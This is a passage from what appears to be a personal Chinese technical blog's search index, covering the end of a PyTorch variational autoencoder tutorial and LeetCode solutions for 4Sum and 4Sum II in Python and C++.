punctuation">(</span>self<span class="token punctuation">,</span> z<span class="token punctuation">)</span><span class="token punctuation">:</span>        h <span class="token operator">=</span> F<span class="token punctuation">.</span>relu<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc4<span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> F<span class="token punctuation">.</span>sigmoid<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc5<span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 整个前向传播过程：编码-》解码</span>    <span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>        mu<span class="token punctuation">,</span> log_var <span class="token operator">=</span> self<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"3:"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>mu<span class="token punctuation">.</span>shape<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"4:"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>log_var<span class="token punctuation">.</span>shape<span class="token punctuation">)</span><span class="token punctuation">)</span>        z <span class="token operator">=</span> self<span class="token punctuation">.</span>reparameterize<span class="token punctuation">(</span>mu<span class="token punctuation">,</span> log_var<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"5:"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>z<span class="token punctuation">.</span>shape<span class="token punctuation">)</span><span class="token punctuation">)</span>        x_reconst <span class="token operator">=</span> self<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>z<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"6:"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>x_reconst<span class="token punctuation">.</span>shape<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> x_reconst<span class="token punctuation">,</span> mu<span class="token punctuation">,</span> log_var<span class="token comment" spellcheck="true"># 实例化一个模型</span>model <span class="token operator">=</span> VAE<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建优化器</span>optimizer <span class="token operator">=</span> torch<span class="token punctuation">.</span>optim<span class="token punctuation">.</span>Adam<span class="token punctuation">(</span>model<span class="token punctuation">.</span>parameters<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> lr<span class="token operator">=</span>learning_rate<span class="token punctuation">)</span><span class="token keyword">for</span> epoch <span class="token keyword">in</span> range<span class="token punctuation">(</span>num_epochs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i<span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> _<span class="token punctuation">)</span> <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>data_loader<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 获取样本，并前向传播</span>        x <span class="token operator">=</span> x<span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span><span class="token punctuation">.</span>view<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> image_size<span class="token punctuation">)</span>        x_reconst<span class="token punctuation">,</span> mu<span class="token punctuation">,</span> log_var <span class="token operator">=</span> model<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 计算重构损失和KL散度（KL散度用于衡量两种分布的相似程度）</span>        <span class="token comment" spellcheck="true"># KL散度的计算可以参考论文或者文章开头的链接</span>        reconst_loss <span class="token operator">=</span> F<span class="token punctuation">.</span>binary_cross_entropy<span class="token punctuation">(</span>x_reconst<span class="token punctuation">,</span> x<span class="token punctuation">,</span> size_average<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        kl_div <span class="token operator">=</span> <span class="token operator">-</span> <span class="token number">0.5</span> <span class="token operator">*</span> torch<span class="token punctuation">.</span>sum<span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> log_var <span class="token operator">-</span> mu<span class="token punctuation">.</span>pow<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> log_var<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 反向传播和优化</span>        loss <span class="token operator">=</span> reconst_loss <span class="token operator">+</span> kl_div        optimizer<span class="token punctuation">.</span>zero_grad<span class="token punctuation">(</span><span class="token punctuation">)</span>        loss<span class="token punctuation">.</span>backward<span class="token punctuation">(</span><span class="token punctuation">)</span>        optimizer<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">100</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Epoch[&amp;#123;&amp;#125;/&amp;#123;&amp;#125;], Step [&amp;#123;&amp;#125;/&amp;#123;&amp;#125;], Reconst Loss: &amp;#123;:.4f&amp;#125;, KL Div: &amp;#123;:.4f&amp;#125;"</span>                  <span class="token punctuation">.</span>format<span class="token punctuation">(</span>epoch <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> num_epochs<span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>data_loader<span class="token punctuation">)</span><span class="token punctuation">,</span> reconst_loss<span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> kl_div<span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 利用训练的模型进行测试</span>    <span class="token keyword">with</span> torch<span class="token punctuation">.</span>no_grad<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 随机生成的图像</span>        z <span class="token operator">=</span> torch<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>batch_size<span class="token punctuation">,</span> z_dim<span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span>        out <span class="token operator">=</span> model<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token punctuation">.</span>view<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span>        save_image<span class="token punctuation">(</span>out<span class="token punctuation">,</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>sample_dir<span class="token punctuation">,</span> <span class="token string">'sampled-&amp;#123;&amp;#125;.png'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>epoch <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 重构的图像</span>        out<span class="token punctuation">,</span> _<span class="token punctuation">,</span> _ <span class="token operator">=</span> model<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        x_concat <span class="token operator">=</span> torch<span class="token punctuation">.</span>cat<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">.</span>view<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">,</span> out<span class="token punctuation">.</span>view<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dim<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>        save_image<span class="token punctuation">(</span>x_concat<span class="token punctuation">,</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>sample_dir<span class="token punctuation">,</span> <span class="token string">'reconst-&amp;#123;&amp;#125;.png'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>epoch <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>reconsPath <span class="token operator">=</span> <span class="token string">'./samples/reconst-15.png'</span>Image <span class="token operator">=</span> mpimg<span class="token punctuation">.</span>imread<span class="token punctuation">(</span>reconsPath<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>Image<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 显示图片</span>plt<span class="token punctuation">.</span>axis<span class="token punctuation">(</span><span class="token string">'off'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 不显示坐标轴</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201422387.png" alt="image-20230306182916704"></p><p>参考链接：<a href="https://zhuanlan.zhihu.com/p/34998569">变分自编码器VAE：原来是这么一回事 | 附开源代码 - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/weixin_46183779/article/details/127771382">(38条消息) VAE 代码实现_vae代码_supermax2020的博客-CSDN博客</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>博客：</p><p><a href="https://www.cnblogs.com/FavoriteStar/archive/2022/12/20/16993656.html#83%E5%BC%82%E5%B8%B8%E6%A3%80%E6%B5%8B">【机器学习】李宏毅——AE自编码器(Auto-encoder) - FavoriteStar - 博客园 (cnblogs.com)</a></p><p><a href="https://www.zhihu.com/topic/21688923/hot">图自编码器（GAE） - 知乎 (zhihu.com)</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIwMDIzNDI2Ng==&mid=2247484815&idx=1&sn=1b891d454d8a43356c29a90671ac108a&source=41#wechat_redirect">【GNN】VGAE：利用变分自编码器完成图重构 (qq.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/83865427">变分自编码器介绍、推导及实现 - 知乎 (zhihu.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/34998569">变分自编码器VAE：原来是这么一回事 | 附开源代码 - 知乎 (zhihu.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/83865427">变分自编码器介绍、推导及实现 - 知乎 (zhihu.com)</a></p><p>视频：</p><p>VAE 损失函数公式每个变量的理解：</p><p><a href="https://www.bilibili.com/video/BV1GG4y1v7CY/?spm_id_from=autoNext&vd_source=5e8f069711510b3788382a0a03ff38e5">【技术干货】自动编码器Autoencoders|EncoderDecoder|图像生成|深度学习进阶|PyTorch深度学习_哔哩哔哩_bilibili</a></p><p>VAE encoder和decoder 理解</p><p><a href="https://www.bilibili.com/video/BV1mT4y1F7u8/?spm_id_from=333.337.search-card.all.click&vd_source=5e8f069711510b3788382a0a03ff38e5">基于变分自编码器(VAE)的Mnist手写体自动生成-DeepSnow_哔哩哔哩_bilibili</a></p><p>VAE 公式推导：</p><p><a href="https://www.bilibili.com/video/BV1Zq4y1h7Tu/?spm_id_from=333.337.search-card.all.click&vd_source=5e8f069711510b3788382a0a03ff38e5">变分自编码器 VAE 鲁鹏_哔哩哔哩_bilibili</a></p><h2 id="待整理"><a href="#待整理" class="headerlink" title="待整理"></a>待整理</h2><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201423514.png" alt="image-20230306183140171"></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201423600.png" alt="image-20230306183151687"></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201423651.png" alt="image-20230306183201681"></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201423328.png" alt="image-20230306183213056"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
            <tag> 图神经网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>18.四数之和&quot;</title>
      <link href="/2023/02/28/18-%E5%9B%9B%E6%95%B0%E4%B9%8B%E5%92%8C/"/>
      <url>/2023/02/28/18-%E5%9B%9B%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="18-四数之和"><a href="#18-四数之和" class="headerlink" title="18. 四数之和"></a><a href="https://leetcode.cn/problems/4sum/">18. 四数之和</a></h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><pre class=" language-python"><code class="language-python">给你一个由 n 个整数组成的数组 nums ，和一个目标值 target 。请你找出并返回满足下述全部条件且不重复的四元组 <span class="token punctuation">[</span>nums<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>d<span class="token punctuation">]</span><span class="token punctuation">]</span> （若两个四元组元素一一对应，则认为两个四元组重复）：<span class="token number">0</span> <span class="token operator">&lt;=</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d <span class="token operator">&lt;</span> na、b、c 和 d 互不相同nums<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">+</span> nums<span class="token punctuation">[</span>b<span class="token punctuation">]</span> <span class="token operator">+</span> nums<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">+</span> nums<span class="token punctuation">[</span>d<span class="token punctuation">]</span> <span class="token operator">==</span> target你可以按 任意顺序 返回答案 。来源：力扣（LeetCode）链接：https<span class="token punctuation">:</span><span class="token operator">//</span>leetcode<span class="token punctuation">.</span>cn<span class="token operator">/</span>problems<span class="token operator">/</span>4sum著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><pre class=" language-python"><code class="language-python">示例 <span class="token number">1</span>：输入：nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> target <span class="token operator">=</span> <span class="token number">0</span>输出：<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>示例 <span class="token number">2</span>：输入：nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> target <span class="token operator">=</span> <span class="token number">8</span>输出：<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>来源：力扣（LeetCode）链接：https<span class="token punctuation">:</span><span class="token operator">//</span>leetcode<span class="token punctuation">.</span>cn<span class="token operator">/</span>problems<span class="token operator">/</span>4sum著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><blockquote><p>python </p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">fourSum</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">:</span><span class="token punctuation">[</span>int<span class="token punctuation">]</span><span class="token punctuation">,</span> target<span class="token punctuation">:</span> int<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">[</span>int<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        ln<span class="token operator">=</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span>        <span class="token keyword">if</span> ln<span class="token operator">&lt;</span><span class="token number">4</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        nums<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>        ans<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>ln<span class="token number">-3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span> <span class="token operator">and</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>nums<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true"># 3数之和一样去重</span>                <span class="token keyword">continue</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>ln<span class="token number">-2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> j<span class="token operator">></span>i<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">and</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span>nums<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                l<span class="token operator">=</span>j<span class="token operator">+</span><span class="token number">1</span>                r<span class="token operator">=</span>ln<span class="token number">-1</span>                <span class="token keyword">while</span> l<span class="token operator">&lt;</span>r<span class="token punctuation">:</span>                    temp<span class="token operator">=</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span>nums<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token operator">+</span>nums<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 注意这可能发生溢出</span>                    <span class="token keyword">if</span> temp<span class="token operator">==</span>target<span class="token punctuation">:</span>                        ans<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>nums<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">,</span>nums<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">[</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>nums<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">,</span>nums<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                        <span class="token keyword">while</span> l<span class="token operator">&lt;</span>r <span class="token operator">and</span> nums<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token operator">==</span>nums<span class="token punctuation">[</span>l<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                            l<span class="token operator">+=</span><span class="token number">1</span>                        <span class="token keyword">while</span> l<span class="token operator">&lt;</span>r <span class="token operator">and</span> nums<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token operator">==</span>nums<span class="token punctuation">[</span>r<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                            r<span class="token operator">-=</span><span class="token number">1</span>                        l<span class="token operator">+=</span><span class="token number">1</span> <span class="token comment" spellcheck="true"># nums[l]!=nums[l+1] 表示l+1可以作为左指针开始 故l+=1</span>                        r<span class="token operator">-=</span><span class="token number">1</span>                    <span class="token keyword">elif</span> temp <span class="token operator">&lt;</span>target<span class="token punctuation">:</span>                        l<span class="token operator">+=</span><span class="token number">1</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        r<span class="token operator">-=</span><span class="token number">1</span>        <span class="token keyword">return</span> ans</code></pre><blockquote><p>c++</p></blockquote><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    vector<vector<int>> fourSum(vector<int>& nums, int target) &#123;        vector<vector<int>> result;        sort(nums.begin(), nums.end());        for (int k = 0; k < nums.size(); k++) &#123;            // 剪枝处理            if (nums[k] > target && nums[k] >= 0) &#123;                break; // 这里使用break，统一通过最后的return返回            &#125;            // 对nums[k]去重            if (k > 0 && nums[k] == nums[k - 1]) &#123;                continue;            &#125;            for (int i = k + 1; i < nums.size(); i++) &#123;                // 对nums[i]去重                if (i > k + 1 && nums[i] == nums[i - 1]) &#123;                    continue;                &#125;                int left = i + 1;                int right = nums.size() - 1;                while (right > left) &#123;                    // nums[k] + nums[i] + nums[left] + nums[right] > target 会溢出                    if ((long) nums[k] + nums[i] + nums[left] + nums[right] > target) &#123;                        right--;                    // nums[k] + nums[i] + nums[left] + nums[right] < target 会溢出                    &#125; else if ((long) nums[k] + nums[i] + nums[left] + nums[right]  < target) &#123;                        left++;                    &#125; else &#123;                        result.push_back(vector<int>&#123;nums[k], nums[i], nums[left], nums[right]&#125;);                        // 对nums[left]和nums[right]去重                        while (right > left && nums[right] == nums[right - 1]) right--;                        while (right > left && nums[left] == nums[left + 1]) left++;                        // 找到答案时，双指针同时收缩                        right--;                        left++;                    &#125;                &#125;            &#125;        &#125;        return result;    &#125;&#125;;</code></pre><h3 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p> 时间复杂度：快速排序 nlogn,遍历三重循环 n^3 故总的时间复杂度n^3</p><p>空间复杂度：log(n)</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://leetcode.cn/problems/4sum/solution/yi-miao-jiu-neng-gao-dong-de-duo-ge-qiu-ya50w/">一秒就能搞懂得多个求和问题（视频+绘图） - 四数之和 - 力扣（LeetCode）</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 双指针 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>454. 四数相加 II</title>
      <link href="/2023/02/28/454-%E5%9B%9B%E6%95%B0%E7%9B%B8%E5%8A%A0-II/"/>
      <url>/2023/02/28/454-%E5%9B%9B%E6%95%B0%E7%9B%B8%E5%8A%A0-II/</url>
      
        <content type="html"><![CDATA[<h1 id="454-四数相加-II"><a href="#454-四数相加-II" class="headerlink" title="454. 四数相加 II"></a><a href="https://leetcode.cn/problems/4sum-ii/">454. 四数相加 II</a></h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><pre class=" language-pythoN"><code class="language-pythoN">给你四个整数数组 nums1、nums2、nums3 和 nums4 ，数组长度都是 n ，请你计算有多少个元组 (i, j, k, l) 能满足：0 <= i, j, k, l < nnums1[i] + nums2[j] + nums3[k] + nums4[l] == 0来源：力扣（LeetCode）链接：https://leetcode.cn/problems/4sum-ii著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><pre class=" language-python"><code class="language-python">示例 <span class="token number">1</span>：输入：nums1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>输出：<span class="token number">2</span>解释：两个元组如下：<span class="token number">1</span><span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> nums1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> nums2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> nums3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> nums4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token number">2</span><span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> nums1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> nums2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> nums3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> nums4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">=</span> <span class="token number">0</span>示例 <span class="token number">2</span>：输入：nums1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>输出：<span class="token number">1</span>来源：力扣（LeetCode）链接：https<span class="token punctuation">:</span><span class="token operator">//</span>leetcode<span class="token punctuation">.</span>cn<span class="token operator">/</span>problems<span class="token operator">/</span>4sum<span class="token operator">-</span>ii著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201425587.png" alt="image-20230228091023042"></p><blockquote><p> python 解法</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">fourSumCount</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums1<span class="token punctuation">:</span> <span class="token punctuation">[</span>int<span class="token punctuation">]</span><span class="token punctuation">,</span> nums2<span class="token punctuation">:</span> <span class="token 